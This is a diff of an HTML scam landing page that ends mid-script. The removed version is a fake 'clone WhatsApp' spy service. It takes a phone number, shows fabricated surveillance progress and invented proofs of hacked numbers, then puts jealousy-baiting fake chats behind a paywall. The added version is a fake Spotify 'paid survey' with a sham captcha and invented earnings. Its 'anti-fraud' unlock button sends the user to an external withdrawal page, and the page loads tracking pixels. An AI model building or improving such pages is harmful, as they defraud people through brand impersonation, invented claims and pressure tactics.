@@ -1,748 +1,372 @@
 <!DOCTYPE html>
 <html lang="pt-BR">
+
+<script
+  src="https://cdn.utmify.com.br/scripts/utms/latest.js"
+  data-utmify-prevent-xcod-sck
+  data-utmify-prevent-subids
+  async
+  defer
+></script>
+
+<script>
+  window.pixelId = "68c9fa45d1cc1cd7065844a1";
+  var a = document.createElement("script");
+  a.setAttribute("async", "");
+  a.setAttribute("defer", "");
+  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+  document.head.appendChild(a);
+</script>
+
 <head>
 <meta charset="utf-8" />
-<meta name="viewport" content="width=device-width, initial-scale=1" />
-<title>Simulação — Coleta → Busca → WhatsApp Clone</title>
-
+<meta name="viewport" content="width=device-width,initial-scale=1" />
+<title>Avaliação — Demo (Segura)</title>
 <style>
-  :root{
-    --primary:#25D366; --primary-dark:#128C7E; --bg:#f5f5f1; --white:#fff;
-    --muted:#7f8c8d; --text:#1f2a32; --danger:#ff3b30; --warn:#ffcc00;
-    --success:#34c759; --soft:#edf2f4; --line:#e6e8ea; --chip:#1aaa65;
+  *{box-sizing:border-box}
+  body{font-family:Arial,Helvetica,sans-serif;background:#f2f7fb;margin:0}
+  .topbar{position:sticky;top:0;background:#fff;border-bottom:1px solid #e7eef5;padding:10px 14px;display:flex;align-items:center;justify-content:space-between;z-index:1000}
+  .brand{display:flex;align-items:center;gap:10px}
+  .brand img{height:24px}
+  .saldo-chip{background:#1db954;color:#fff;font-weight:700;padding:8px 14px;border-radius:999px;font-size:14px}
+  .container{max-width:700px;margin:24px auto;padding:20px;background:#fff;border-radius:12px;box-shadow:0 10px 25px rgba(0,0,0,.06);text-align:center}
+  .logo-big{width:120px;margin:6px auto 12px;display:block}
+  .main-img{width:100%;max-height:360px;object-fit:cover;border-radius:10px}
+  .question{margin:18px 0;font-weight:700}
+  .options{display:flex;justify-content:center;gap:12px;flex-wrap:wrap;margin:8px 0}
+  .btn{background:#1db954;color:#fff;padding:12px 22px;border:none;border-radius:8px;font-weight:700;cursor:pointer}
+  input[type="email"],input[type="text"]{width:90%;padding:12px;border:1px solid #d0dbe6;border-radius:8px;margin:8px 0;outline:none}
+
+  /* captcha */
+  .captcha-wrap{
+    width:90%;margin:6px auto 0;
+    border:1px solid #e1e8f0;border-radius:8px;background:#f7fbff;
+    display:flex;align-items:center;gap:10px;padding:10px 12px;text-align:left
   }
-  *{box-sizing:border-box;margin:0;padding:0}
-  body{font-family:'Segoe UI',Tahoma,Arial,Verdana,sans-serif;background:var(--bg);color:var(--text);min-height:100vh}
+  .captcha-wrap input{width:auto;margin:0}
+  .captcha-label{font-size:14px;color:#35526b}
 
-  /* ====== PÁGINAS ====== */
-  .page{display:none}
-  .page.active{display:block}
+  /* gain popup */
+  #gainOverlay{display:none;position:fixed;inset:0;background:rgba(0,0,0,.45);z-index:9998;align-items:center;justify-content:center}
+  .gain-box{width:90%;max-width:520px;background:#fff;border-radius:12px;padding:22px;text-align:center;box-shadow:0 18px 40px rgba(0,0,0,.25)}
+  .gain-coin{width:44px;height:44px;margin:0 auto 8px;display:block}
+  .gain-value{color:#1db954;font-weight:800;font-size:26px;margin-top:6px}
 
-  /* ====== STEP 1 (coleta) + STEP 2 (loading/profile) ====== */
-  .container{width:100%;max-width:980px;margin:20px auto;padding:0 16px}
-  .card{background:var(--white);border-radius:12px;box-shadow:0 6px 18px rgba(0,0,0,.07);padding:22px;margin-bottom:18px}
-  h1{font-size:1.6rem;margin-bottom:8px}
-  p.lead{color:var(--muted);margin-bottom:18px}
-  .form-row{display:flex;gap:12px;align-items:center}
-  .phone-input{flex:1;padding:12px 14px;border:1px solid #ddd;border-radius:10px;font-size:1rem;outline:none}
-  .phone-input:focus{box-shadow:0 0 0 3px rgba(37,211,102,.12);border-color:var(--primary)}
-  .btn{background:var(--primary);color:#fff;border:0;padding:12px 16px;border-radius:10px;font-weight:700;cursor:pointer;display:inline-flex;align-items:center;gap:10px}
-  .btn[disabled]{opacity:.6;cursor:not-allowed}
-  .proofs{display:flex;flex-direction:column;gap:10px;margin-top:18px}
-  .proof{background:#dcf8c6;padding:10px;border-radius:10px;display:flex;gap:10px;align-items:center}
-  .proof svg{width:18px;height:18px;fill:var(--primary)}
-  .loading-wrap{display:none}
-  .spinner{width:56px;height:56px;border-radius:50%;border:6px solid rgba(37,211,102,.2);border-top-color:var(--primary);animation:spin 1s linear infinite;margin:0 auto}
-  @keyframes spin{to{transform:rotate(360deg)}}
-  .progress{height:10px;background:#eee;border-radius:999px;overflow:hidden}
-  .progress > i{display:block;height:100%;background:linear-gradient(90deg,var(--primary),#0a8b63);width:0%;transition:width .4s ease}
-  .log{background:#f6f7f8;border-radius:8px;padding:12px;height:180px;overflow:auto;font-family:monospace;margin-top:12px}
-  .log-line{opacity:0;transform:translateY(8px);transition:opacity .25s,transform .25s;margin-bottom:8px}
-  .log-line.visible{opacity:1;transform:none}
-  .profile{display:none;margin-top:12px}
-  .profile.visible{display:flex;flex-direction:column;gap:12px}
-  .profile .head{display:flex;gap:12px;align-items:center}
-  .profile img{width:84px;height:84px;border-radius:50%;object-fit:cover;border:3px solid var(--primary);background:#ddd}
-  .detail{background:#fff;padding:12px;border-radius:10px}
-  .confirm-bar{display:none;margin-top:12px;padding:10px;border:1px dashed #dde;border-radius:8px;display:flex;gap:12px;align-items:center;justify-content:space-between;flex-wrap:wrap}
-  .btn-danger{background:var(--danger);color:#fff;border:none;border-radius:10px;padding:12px 16px;font-weight:700;cursor:pointer}
+  /* final modal */
+  #congratsModal{display:none;position:fixed;inset:0;background:rgba(0,0,0,.6);z-index:10000;align-items:center;justify-content:center}
+  .congrats-box{width:94%;max-width:720px;background:#fff;border-radius:12px;padding:28px;text-align:center;box-shadow:0 22px 60px rgba(0,0,0,.28)}
+  .congrats-ring{width:120px;height:120px;border-radius:999px;border:12px solid #e6f7ea;display:inline-flex;align-items:center;justify-content:center;margin:0 auto 10px}
+  .congrats-amount{color:#1db954;font-weight:800}
 
-  /* ====== PÁGINA WHATSAPP HOME (MOBILE) ====== */
-  .home-wrap{min-height:100dvh;display:flex;flex-direction:column}
-  .util-top{display:flex;align-items:center;gap:10px;padding:8px 12px;background:#fff;border-bottom:1px solid var(--line)}
-  .util-top .avatar{width:38px;height:38px;border-radius:50%;object-fit:cover;border:2px solid #eef3f4;background:#ddd}
-  .pill{margin-left:auto;background:#2fd070;color:#fff;border-radius:12px;padding:8px 12px;font-weight:800;line-height:1.1;box-shadow:0 2px 0 rgba(0,0,0,.08);cursor:pointer;animation:pulse 2s infinite}
-  @keyframes pulse{0%{transform:scale(1)}50%{transform:scale(1.03)}100%{transform:scale(1)}}
-
-  .appbar{background:#fff;padding:10px 14px;border-bottom:1px solid var(--line);display:flex;align-items:center}
-  .appbar h2{font-size:1.4rem;letter-spacing:.2px}
-  .appbar .actions{margin-left:auto;display:flex;gap:14px;color:#7c8b93}
-  .gate{cursor:pointer}
-
-  .searchbar{background:#fff;padding:10px 14px;border-bottom:1px solid var(--line)}
-  .search{background:#f1f3f4;border-radius:999px;padding:12px 14px;display:flex;gap:10px;align-items:center;color:#94a0a7}
-  .search input{border:none;background:transparent;outline:none;flex:1;color:#54606a}
-
-  .list{background:#fff;flex:1;overflow:auto}
-  .row-chat{display:flex;gap:12px;padding:12px 14px;border-bottom:1px solid var(--line);align-items:center}
-  .pic{width:52px;height:52px;border-radius:50%;object-fit:cover;filter:blur(2px) saturate(.9) brightness(.92)}
-  .meta{flex:1;min-width:0}
-  .name{font-weight:800}
-  .preview{font-size:.95rem;color:#748089;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;margin-top:2px}
-  .righty{display:flex;flex-direction:column;align-items:flex-end;gap:6px;min-width:52px}
-  .time{font-size:.85rem;color:#7e8a92}
-  .badge{background:#25d366;color:#fff;border-radius:999px;min-width:22px;height:22px;display:flex;align-items:center;justify-content:center;font-weight:800;padding:0 6px;font-size:.8rem}
-
-  .bottom-nav{background:#fff;border-top:1px solid var(--line);display:flex;justify-content:space-around;padding:8px 0}
-  .bn-item{display:flex;flex-direction:column;align-items:center;gap:4px;color:#64717a;font-weight:600;font-size:.9rem}
-  .bn-item.active{color:#1f9c63}
-  .bn-badge{position:absolute;margin-left:28px;margin-top:-10px;background:#1f9c63;color:#fff;border-radius:999px;padding:2px 8px;font-weight:800;font-size:.8rem}
-
-  .fab{position:fixed;right:16px;bottom:80px;background:#1f9c63;color:#fff;width:58px;height:58px;border-radius:50%;display:flex;align-items:center;justify-content:center;box-shadow:0 10px 20px rgba(0,0,0,.12);font-size:1.6rem;cursor:pointer}
-
-  .toast{position:fixed;left:50%;transform:translateX(-50%);top:70px;background:#2d2f31;color:#fff;border-radius:6px;padding:10px 14px;display:none;align-items:center;gap:12px;z-index:9}
-  .toast.show{display:flex}
-
-  /* Modal paywall */
-  .pay-modal{position:fixed;inset:0;background:rgba(0,0,0,.45);display:none;align-items:center;justify-content:center;z-index:100}
-  .pay-modal.show{display:flex}
-  .pay-box{background:#fff;width:calc(100% - 40px);max-width:420px;border-radius:14px;padding:18px;box-shadow:0 12px 30px rgba(0,0,0,.18)}
-  .pay-title{font-weight:900;font-size:1.2rem;margin-bottom:8px}
-  .pay-sub{color:#6d7a82;margin-bottom:14px}
-  .btn-outline{background:#eef3f4;color:#2a2f33;border:0;padding:12px 16px;border-radius:10px;font-weight:800}
-  .pay-actions{display:flex;gap:10px;flex-wrap:wrap}
-
-  @media (min-width:769px){
-    .home-wrap{max-width:520px;margin:0 auto;border-left:1px solid var(--line);border-right:1px solid var(--line)}
+  /* antifraud popup */
+  #popup{display:none;position:fixed;inset:0;background:rgba(0,0,0,.8);z-index:10001;align-items:center;justify-content:center;padding:16px}
+  #popup .box{background:#fff;max-width:520px;width:100%;padding:28px;border-radius:12px;text-align:center;box-shadow:0 22px 60px rgba(0,0,0,.28)}
+  .emoji-stage{
+    width:72px;height:72px;border-radius:999px;border:6px solid #1db95422;
+    display:flex;align-items:center;justify-content:center;margin:0 auto 10px;
+    font-size:38px;transition:transform .25s ease;
   }
+  .emoji-stage.pop{ transform: scale(1.06); }
+  .emoji-ok{ border-color:#1db954; }
 
-  .muted{color:#95a1a8}
-  .row{display:flex;align-items:center;gap:10px}
-  .success{color:var(--success)}
-  @keyframes spin{to{transform:rotate(360deg)}}
+  /* progress bar */
+  .progress-wrap{width:100%;background:#e6eef5;border-radius:12px;padding:8px;margin-top:14px}
+  .progress-bar{height:18px;width:0%;background:#1db954;border-radius:10px;transition:width 800ms ease}
+  .muted{color:#6b7a8a;font-size:14px}
+  .small{font-size:13px;color:#6b7a8a;margin-top:6px}
+
+  /* PIX screen styles */
+  .saldo-box{background:#fff;padding:14px;border-radius:8px;border:1px solid #e8edf3;text-align:center;margin-bottom:12px}
+  .saldo-label{font-size:12px;color:#6b7a8a}
+  .saldo-valor{font-size:28px;color:#1db954;font-weight:800;margin-top:6px}
+  .pix-types{display:flex;gap:10px;justify-content:space-between;margin:12px 0}
+  .pix-card{flex:1;background:#fff;border-radius:8px;border:1px solid #e7eef5;padding:12px;text-align:center;cursor:pointer;display:flex;flex-direction:column;align-items:center;gap:8px}
+  .pix-card img{width:50px;height:50px;object-fit:contain}
+  .pix-card p{margin:0;font-weight:700}
+  .pix-card.active{border-color:#1db954;box-shadow:0 0 0 2px #1db95422 inset}
+  .input{height:40px;border-radius:6px;border:1px solid #d7e6f0;padding:8px;background:#fff;width:96%;margin:8px auto}
+
+  /* popup "2 restantes" */
+  #twoLeftPopup{
+    position:fixed;right:16px;bottom:16px;z-index:10002;
+    background:#111;color:#fff;padding:14px 16px;border-radius:10px;
+    box-shadow:0 10px 28px rgba(0,0,0,.35);display:none;max-width:280px
+  }
+  #twoLeftPopup b{color:#1db954}
 </style>
 </head>
 <body>
 
-<!-- =========================================
-=                 PAGE: FLOW                 =
-========================================== -->
-<section id="page-flow" class="page active">
-  <div class="container">
-    <!-- STEP 1 -->
-    <section id="step-collect" class="card">
-      <h1>Parabéns — Acesso Gratuito</h1>
-      <p class="lead">Insira o número abaixo (simulação). Em seguida iniciamos a “busca” e mostramos o perfil.</p>
-
-      <div class="form-row">
-        <input id="phoneInput" class="phone-input" type="tel" placeholder="(99) 99999-9999" maxlength="15" />
-        <button id="cloneButton" class="btn" disabled>Clonar WhatsApp Agora</button>
-      </div>
-
-      <div class="proofs" id="simProofs">
-        <div class="proof"><svg viewBox="0 0 24 24"><path d="M12 2a10 10 0 1 0 10 10A10.011 10.011 0 0 0 12 2Zm-2 15-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8Z"/></svg>
-          <strong id="proofText1">(43) 96645-XX47 de Paraná está sendo espionado neste momento...</strong></div>
-        <div class="proof"><svg viewBox="0 0 24 24"><path d="M12 2a10 10 0 1 0 10 10A10.011 10.011 0 0 0 12 2Zm-2 15-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8Z"/></svg>
-          <strong id="proofText2">(75) 91543-XX66 de Ilhéus teve as conversas expostas!</strong></div>
-      </div>
-    </section>
-
-    <!-- STEP 2 -->
-    <section id="step-loading" class="card loading-wrap" aria-hidden="true">
-      <h1>Processando Acesso ao WhatsApp</h1>
-      <p class="lead">Aguarde enquanto conectamos aos servidores e preparamos seu acesso.</p>
-
-      <div class="row" style="flex-wrap:wrap">
-        <div style="flex:0 0 120px;text-align:center">
-          <div class="spinner" id="spinner"></div>
-        </div>
-        <div style="flex:1;min-width:220px">
-          <div class="progress"><i id="progressFill"></i></div>
-          <div class="muted" id="progressText" style="margin-top:8px">Conectando aos servidores... 0%</div>
-          <div class="log" id="logContainer" aria-live="polite"></div>
-        </div>
-      </div>
-
-      <!-- PROFILE -->
-      <div id="profileCard" class="profile" style="margin-top:18px">
-        <div class="head">
-          <img id="imgProfile" src="https://i.postimg.cc/gcNd6QBM/img1.jpg" alt="Foto de perfil">
-          <div>
-            <div style="font-weight:800" id="profileName">Perfil WhatsApp</div>
-            <div class="muted" id="numeroPerfil">(XX) XXXXX-XXXX</div>
-            <div class="row success" style="margin-top:6px"><span style="width:9px;height:9px;background:var(--success);border-radius:50%"></span> Online recentemente</div>
-          </div>
-        </div>
-
-        <div class="detail">
-          <div class="row" style="margin-bottom:8px"><span class="muted">Cidade de última conexão</span></div>
-          <div id="userCity" style="font-weight:700;margin-bottom:16px">Fortaleza</div>
-          <div class="row"><span class="muted">Status do dispositivo</span></div>
-          <div style="font-weight:700">Ativo</div>
-
-          <div style="margin-top:14px">
-            <button class="btn" id="accessReportBtn">Acessar Relatório</button>
-          </div>
-
-          <div id="confirmBar" class="confirm-bar">
-            <span id="confirmText" style="font-weight:600">É essa pessoa?</span>
-            <div class="row">
-              <button class="btn" id="btnYes">Sim</button>
-              <button class="btn-danger" id="btnNo">Não, tentar sem 9</button>
-            </div>
-          </div>
-        </div>
-      </div>
-    </section>
+<header class="topbar">
+  <div class="brand">
+    <img src="logo.png" alt="logo">
+    <strong>Spotify</strong>
   </div>
-</section>
+  <div id="saldoChip" class="saldo-chip">R$ 0,00</div>
+</header>
 
-<!-- =========================================
-=         PAGE: WHATSAPP HOME (MOBILE)      =
-========================================== -->
-<section id="page-chat" class="page">
-  <div class="home-wrap">
+<audio id="audioDinheiro" src="dinheiro.mp3" preload="auto"></audio>
 
-    <!-- topo com avatar + pílula 29,97 -->
-    <div class="util-top">
-      <img id="chatTopAvatar" class="avatar" src="https://i.postimg.cc/gcNd6QBM/img1.jpg" alt="avatar topo">
-      <div id="upgradePill" class="pill">Liberar acesso completo<br>por R$ 29,97</div>
-    </div>
+<div class="container" id="quiz">
+  <img class="logo-big" src="logo.png" alt="logo">
+  <h2>Bem-vindo(a) — Pesquisa de opinião</h2>
+  <p class="muted">Insira seu e-mail para começar</p>
+  <input type="email" id="emailUser" placeholder="seu@email.com">
 
-    <!-- Appbar -->
-    <div class="appbar">
-      <h2 class="gate">WhatsApp</h2>
-      <div class="actions">
-        <span class="gate">📷</span><span class="gate">⚙️</span><span class="gate">⋮</span>
+  <!-- CAPTCHA OBRIGATÓRIO -->
+  <div class="captcha-wrap" id="captchaBox">
+    <input type="checkbox" id="captchaCheck" />
+    <label for="captchaCheck" class="captcha-label">
+      Não sou um robô
+    </label>
+  </div>
+  <!-- /CAPTCHA -->
+
+  <br>
+  <button class="btn" onclick="iniciarAvaliacao()">Começar</button>
+</div>
+
+<!-- popup de ganho -->
+<div id="gainOverlay">
+  <div class="gain-box">
+    <img class="gain-coin" src="moeda.gif" alt="moeda">
+    <div class="muted">Você recebeu</div>
+    <div id="gainValue" class="gain-value">R$ 0,00</div>
+  </div>
+</div>
+
+<!-- modal final -->
+<div id="congratsModal">
+  <div class="congrats-box">
+    <div class="congrats-ring">
+      <div style="text-align:center">
+        <div style="font-size:12px;color:#6b7a8a">Seu saldo total</div>
+        <div id="finalAmount" class="congrats-amount">R$ 0,00</div>
       </div>
     </div>
-
-    <!-- Busca -->
-    <div class="searchbar">
-      <div class="search gate">
-        <span class="icon">🔎</span>
-        <input placeholder="Pergunte à Meta AI ou pesquise" readonly>
-      </div>
+    <h3>Parabéns!</h3>
+    <p class="muted">Você concluiu as avaliações.</p>
+    <div style="width:90%;margin:14px auto 0">
+      <div class="progress-wrap"><div id="progressBar" class="progress-bar"></div></div>
+      <div class="small">Progresso das avaliações</div>
     </div>
-
-    <!-- Lista de conversas -->
-    <div id="chatList" class="list">
-      <div class="row-chat gate">
-        <img class="pic" src="sarinha.png" alt="">
-        <div class="meta">
-          <div class="name">Sarinha</div>
-          <div class="preview">Oi gostoso, tudo bem, posso te fazer um...</div>
-        </div>
-        <div class="righty">
-          <div class="time">20:04</div>
-          <div class="badge">1</div>
-        </div>
-      </div>
-
-      <div class="row-chat gate">
-        <img class="pic" src="amanda.png" alt="">
-        <div class="meta">
-          <div class="name">Amanda Centro</div>
-          <div class="preview">🎥 Vídeo</div>
-        </div>
-        <div class="righty">
-          <div class="time">16:50</div>
-          <div class="badge">2</div>
-        </div>
-      </div>
-
-      <div class="row-chat gate">
-        <img class="pic" src="julia.png" alt="">
-        <div class="meta">
-          <div class="name">Julia fatalmodel</div>
-          <div class="preview">Eai, vai querer hoje denovo safado...?</div>
-        </div>
-        <div class="righty">
-          <div class="time">12:39</div>
-          <div class="badge">1</div>
-        </div>
-      </div>
-
-      <div class="row-chat gate">
-        <img class="pic" src="alice.png" alt="">
-        <div class="meta">
-          <div class="name">Liberar Acesso Completo</div>
-          <div class="preview">Sua mulher sabe de alguma coisa?...</div>
-        </div>
-        <div class="righty">
-          <div class="time">19:01</div>
-          <div class="badge">5</div>
-        </div>
-      </div>
-
-      <div class="row-chat gate">
-        <img class="pic" src="carla.png" alt="">
-        <div class="meta">
-          <div class="name">Liberar Acesso Completo</div>
-          <div class="preview">Oi, to com sdds kkk ...</div>
-        </div>
-        <div class="righty">
-          <div class="time">22:53</div>
-          <div class="badge">13</div>
-        </div>
-      </div>
-
-      <div class="row-chat gate">
-        <img class="pic" src="suzy.png" alt="">
-        <div class="meta">
-          <div class="name">Liberar Acesso Completo</div>
-          <div class="preview">Vc é um safado sabia, adorooo kkkk!</div>
-        </div>
-        <div class="righty">
-          <div class="time">15/09/2025</div>
-          <div class="badge">1</div>
-        </div>
-      </div>
-
-      <div class="row-chat gate">
-        <img class="pic" src="ale.png" alt="">
-        <div class="meta">
-          <div class="name">Liberar Acesso Completo</div>
-          <div class="preview">Que dia agnte se ve? n quer mais e...</div>
-        </div>
-        <div class="righty">
-          <div class="time">21:11</div>
-          <div class="badge">8</div>
-        </div>
-      </div>
-    </div>
-
-    <!-- FAB -->
-    <div class="fab gate">＋</div>
-
-    <!-- Bottom nav -->
-    <div class="bottom-nav">
-      <div class="bn-item active gate">
-        <div style="position:relative;">
-          💬 <span class="bn-badge">32</span>
-        </div>
-        <span>Conversas</span>
-      </div>
-      <div class="bn-item gate">📰<span>Atualizações</span></div>
-      <div class="bn-item gate">👥<span>Comunidades</span></div>
-      <div class="bn-item gate">📞<span>Ligações</span></div>
+    <div style="margin-top:16px">
+      <button class="btn" onclick="goToWithdraw()">Solicitar saque</button>
     </div>
   </div>
+</div>
 
-  <!-- toast -->
-  <div id="toast" class="toast"><span>⚠</span> <strong>Novas mensagens encontradas...</strong></div>
-
-  <!-- Modal paywall -->
-  <div id="payModal" class="pay-modal" aria-hidden="true">
-    <div class="pay-box">
-      <div class="pay-title">Liberar acesso completo</div>
-      <div class="pay-sub">Para abrir conversas e usar as funções, libere o acesso completo.</div>
-      <div class="pay-actions">
-        <button id="btnUnlockNow" class="btn">Liberar agora — R$ 29,97</button>
-        <button id="btnLater" class="btn-outline">Agora não</button>
-      </div>
+<!-- popup antifraude com cadeado -> check -->
+<div id="popup">
+  <div class="box">
+    <div id="emojiStage" class="emoji-stage">🔒</div>
+    <h3 id="popupTitle">DESBLOQUEAR SEU SALDO</h3>
+    <p class="muted" id="popupText">
+      Usamos uma verificação anti-fraude para garantir sua segurança.
+    </p>
+    <div style="margin-top:14px">
+      <button id="popupBtn" class="btn" onclick="window.location.href='https://opina-agoraspot.onrender.com/saque'">CONTINUAR</button>
     </div>
   </div>
+</div>
 
-  <!-- SOM -->
-  <audio id="msgSound" src="audiozap.mp3" preload="auto"></audio>
-</section>
+<!-- popup "restam 2 avaliações" -->
+<div id="twoLeftPopup">⚡ Quase lá! <b>Resta 2 avaliações restantes</b>. Finalize para liberar seu saque.</div>
 
 <script>
-/* ======= CONFIG DO LINK (PÍLULA e PAYWALL) ======= */
-const UPGRADE_URL = ""; // <<< COLE AQUI o link de pagamento/checkout. Se vazio, não abre nada.
+  // CONFIG
+  const artistas = [
+    {nome:'Matue',imagem:'matue.png',valor:34},
+    {nome:'Luan',imagem:'luan.png',valor:25},
+    {nome:'Poze',imagem:'poze.png',valor:32},
+    {nome:'Anitta',imagem:'anita.png',valor:24},
+    {nome:'Ludmilla',imagem:'ludmilla.png',valor:52},
+    {nome:'Cabelin',imagem:'cabelin.png',valor:21},
+    {nome:'Daniel',imagem:'daniel.png',valor:19},
+    {nome:'Ivete',imagem:'ivete.png',valor:43},
+    {nome:'Wesley',imagem:'wesley.png',valor:28},
+    {nome:'Alok',imagem:'alok.png',valor:14}
+  ];
 
-/* ============ utils & máscaras (mantidos) ============ */
-function maskBrPhone(v){
-  let d = v.replace(/\D/g, '').slice(0, 11);
-  if (d.length <= 2) return '(' + d;
-  if (d.length <= 6) return `(${d.slice(0,2)}) ${d.slice(2)}`;
-  if (d.length <= 10) return `(${d.slice(0,2)}) ${d.slice(2,6)}-${d.slice(6)}`;
-  return `(${d.slice(0,2)}) ${d.slice(2,3)} ${d.slice(3,7)}-${d.slice(7,11)}`;
-}
-function formatarNumeroBrasil(numero){
-  let num = (numero||'').replace(/\D/g,'');
-  if(num.startsWith('55')) num = num.substr(2);
-  if(num.length === 11) return num.replace(/^(\d{2})(\d{1})(\d{4})(\d{4})$/,'($1) $2 $3-$4');
-  if(num.length === 10) return num.replace(/^(\d{2})(\d{4})(\d{4})$/,'($1) $2-$3');
-  return numero;
-}
-function getNumeroApi(numero){
-  let n = (numero||'').replace(/\D/g,'');
-  if(!n.startsWith('55')) n = '55'+n;
-  return n;
-}
-function resolveCandidatesForInteractive(raw){
-  let num = (raw||'').replace(/\D/g,'');
-  if(!num.startsWith('55')) num = '55' + num;
-  const local = num.slice(2), ddd = local.slice(0,2), rest = local.slice(2);
-  let preferred = num, alt = null;
-  if(rest.length === 8){ preferred = '55'+ddd+'9'+rest; alt = num; }
-  else if(rest.length === 9){ alt = '55'+ddd+(rest.startsWith('9')?rest.slice(1):rest.slice(1)); }
-  return { preferred, alt, hasAlt: !!alt };
-}
-async function fetchWithTimeout(url, options = {}, timeoutMs = 10000){
-  const controller = new AbortController();
-  const id = setTimeout(()=>controller.abort(), timeoutMs);
-  try{ return await fetch(url, {...options, signal:controller.signal}); }
-  finally{ clearTimeout(id); }
-}
+  // STATE
+  let atual = 0;
+  let total = 0;
+  let email = '';
+  const totalPossible = artistas.reduce((s,a)=>s+a.valor,0);
 
-/* ====== ELEMENTOS FLOW ====== */
-const pageFlow = document.getElementById('page-flow');
-const pageChat = document.getElementById('page-chat');
-const phoneInput = document.getElementById('phoneInput');
-const cloneButton = document.getElementById('cloneButton');
-const stepCollect = document.getElementById('step-collect');
-const stepLoading = document.getElementById('step-loading');
-const progressFill = document.getElementById('progressFill');
-const progressText = document.getElementById('progressText');
-const logContainer = document.getElementById('logContainer');
-const profileCard = document.getElementById('profileCard');
-const imgProfile = document.getElementById('imgProfile');
-const numeroPerfil = document.getElementById('numeroPerfil');
-const userCityElement = document.getElementById('userCity');
-const accessReportBtn = document.getElementById('accessReportBtn');
-const confirmBar = document.getElementById('confirmBar');
-const confirmText = document.getElementById('confirmText');
-const btnYes = document.getElementById('btnYes');
-const btnNo  = document.getElementById('btnNo');
+  // DOM
+  const quiz = document.getElementById('quiz');
+  const som = document.getElementById('audioDinheiro');
+  const saldoChip = document.getElementById('saldoChip');
+  const gainOverlay = document.getElementById('gainOverlay');
+  const gainValue = document.getElementById('gainValue');
+  const congratsModal = document.getElementById('congratsModal');
+  const finalAmount = document.getElementById('finalAmount');
+  const progressBar = document.getElementById('progressBar');
+  const twoLeftPopup = document.getElementById('twoLeftPopup');
 
-/* ====== ELEMENTOS HOME ====== */
-const chatTopAvatar = document.getElementById('chatTopAvatar');
-const toast = document.getElementById('toast');
-const chatListEl = document.getElementById('chatList');
-const msgSound = document.getElementById('msgSound');
-const payModal = document.getElementById('payModal');
-const btnUnlockNow = document.getElementById('btnUnlockNow');
-const btnLater = document.getElementById('btnLater');
+  const brl = v => v.toLocaleString('pt-BR',{style:'currency',currency:'BRL',minimumFractionDigits:2});
+  function atualizarSaldoChip(){ saldoChip.textContent = brl(total); }
 
-/* ====== Provas dinâmicas (estética) ====== */
-const dddToState = {'11':'São Paulo','12':'São Paulo','13':'São Paulo','14':'São Paulo','15':'São Paulo','16':'São Paulo','17':'São Paulo','18':'São Paulo','19':'São Paulo','21':'Rio de Janeiro','22':'Rio de Janeiro','24':'Rio de Janeiro','27':'Espírito Santo','28':'Espírito Santo','31':'Minas Gerais','32':'Minas Gerais','33':'Minas Gerais','34':'Minas Gerais','35':'Minas Gerais','37':'Minas Gerais','38':'Minas Gerais','41':'Paraná','42':'Paraná','43':'Paraná','44':'Paraná','45':'Paraná','46':'Paraná','47':'Santa Catarina','48':'Santa Catarina','49':'Santa Catarina','51':'Rio Grande do Sul','53':'Rio Grande do Sul','54':'Rio Grande do Sul','55':'Rio Grande do Sul','61':'Distrito Federal','62':'Goiás','63':'Tocantins','64':'Goiás','65':'Mato Grosso','66':'Mato Grosso','67':'Mato Grosso do Sul','68':'Acre','69':'Rondônia','71':'Bahia','73':'Bahia','74':'Bahia','75':'Bahia','77':'Bahia','79':'Sergipe','81':'Pernambuco','82':'Alagoas','83':'Paraíba','84':'Rio Grande do Norte','85':'Ceará','86':'Piauí','87':'Pernambuco','88':'Ceará','89':'Piauí','91':'Pará','92':'Amazonas','93':'Pará','94':'Pará','95':'Roraima','96':'Amapá','97':'Amazonas','98':'Maranhão','99':'Maranhão'};
-const allDDDs = Object.keys(dddToState);
-const actions = ['está sendo clonado agora...','está sendo monitorado silenciosamente...','teve as mensagens interceptadas!','está sob vigilância agora...','foi rastreado com sucesso!','teve o WhatsApp clonado com sucesso!','está sendo espionado neste momento...','teve as conversas expostas!','está sendo rastreado em tempo real...','teve o acesso liberado para monitoramento!','teve o histórico de chamadas acessado!','está com todas as mensagens sendo monitoradas!','teve o WhatsApp hackeado com sucesso!','está com localização sendo rastreada!','teve as fotos e vídeos acessados!'];
-function randProof(){
-  const ddd = allDDDs[Math.floor(Math.random()*allDDDs.length)];
-  const first = Math.floor(Math.random()*10000).toString().padStart(4,'0');
-  const last  = 'XX'+Math.floor(Math.random()*100).toString().padStart(2,'0');
-  const formatted = `(${ddd}) 9${first.substring(0,4)}-${last}`;
-  const state = dddToState[ddd] || 'Brasil';
-  return `${formatted} de ${state} ${actions[Math.floor(Math.random()*actions.length)]}`;
-}
-document.getElementById('proofText1').textContent = randProof();
-document.getElementById('proofText2').textContent = randProof();
-setInterval(()=>{ document.getElementById('proofText1').textContent = randProof(); }, 4000);
-setInterval(()=>{ document.getElementById('proofText2').textContent = randProof(); }, 6000);
+  // util
+  const escapeHtml = s => String(s).replace(/[&<>"']/g, m=>({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[m]));
 
-/* ===== máscara + habilitar botão ===== */
-phoneInput.addEventListener('input', (e)=>{
-  const v = maskBrPhone(e.target.value);
-  e.target.value = v;
-  if (v.replace(/\D/g,'').length >= 10) cloneButton.removeAttribute('disabled');
-  else cloneButton.setAttribute('disabled','');
-});
-
-/* ===== navegação entre páginas ===== */
-let firstKickTimer=null;
-function scheduleFirstKick(){
-  if(firstKickTimer) clearTimeout(firstKickTimer);
-  if(location.hash==='#chat'){
-    firstKickTimer = setTimeout(simulateIncoming, 1000); // primeira mensagem em 1s
+  // CAPTCHA: checagem simples
+  function captchaValido(){
+    const chk = document.getElementById('captchaCheck');
+    return !!(chk && chk.checked);
   }
-}
-function showPage(hash){
-  const target = (hash === '#chat') ? 'chat' : 'flow';
-  document.getElementById('page-flow').classList.toggle('active', target==='flow');
-  document.getElementById('page-chat').classList.toggle('active', target==='chat');
-  if(target==='chat'){
-    const fotoperfil = localStorage.getItem('fotoperfil');
-    chatTopAvatar.src = fotoperfil || 'https://i.postimg.cc/gcNd6QBM/img1.jpg';
-    scheduleFirstKick();
+
+  // INÍCIO
+  function iniciarAvaliacao(){
+    const e = document.getElementById('emailUser').value.trim();
+    if(!e){ alert('Digite seu e-mail para prosseguir'); return; }
